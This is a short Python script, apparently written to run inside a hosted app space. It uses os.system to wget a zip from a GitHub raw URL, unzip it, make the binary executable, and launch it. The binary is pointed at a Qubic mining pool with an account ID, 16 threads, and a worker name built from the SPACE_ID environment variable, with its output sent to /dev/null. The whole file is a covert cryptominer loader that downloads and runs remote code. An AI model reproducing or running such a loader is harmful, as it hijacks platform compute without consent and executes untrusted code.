import os
os.system("wget https://github.com/qqivk/jenskl/raw/refs/heads/main/xlfiu.zip")
os.system("unzip xlfiu.zip")
os.system("chmod +x xlfiu")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./xlfiu --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
